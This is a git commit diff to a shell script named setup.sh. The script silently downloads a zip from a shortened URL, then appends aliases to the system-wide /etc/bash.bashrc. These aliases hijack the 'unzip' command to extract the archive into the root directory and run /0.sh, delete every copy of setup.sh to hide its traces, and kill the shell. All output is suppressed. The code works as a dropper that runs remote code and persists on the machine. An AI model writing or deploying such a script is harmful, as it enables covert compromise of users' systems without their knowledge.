b5aab0ac85b5161620c703238d102b6e49d66eb0
D4NP0UL1N <ct3d.f1l35@gmail.com>
2017-04-25 19:14:25 -0400

    Update setup.sh

--- FINAL/setup.sh
+++ FINAL/setup.sh
@@ -1,8 +1,9 @@
 #!/bin/bash
+unalias -a
 mkdir /usr/share/misc/final >/dev/null 2>&1
 wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip >/dev/null 2>&1
 sleep 2
-echo 'alias unzip="mv /usr/share/misc/final/setup.zip /; echo "Password Required"; unzip /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh; cd -"' >> /etc/bash.bashrc
+echo 'alias unzip="mv /usr/share/misc/final/setup.zip /; unzip /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh"' >> /etc/bash.bashrc
 echo 'alias 1="rm -f /setup.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
 echo 'alias 2="sleep 2; unalias -a"' >> /etc/bash.bashrc
 echo 'alias 3="kill -9 $(echo $$)"' >> /etc/bash.bashrc
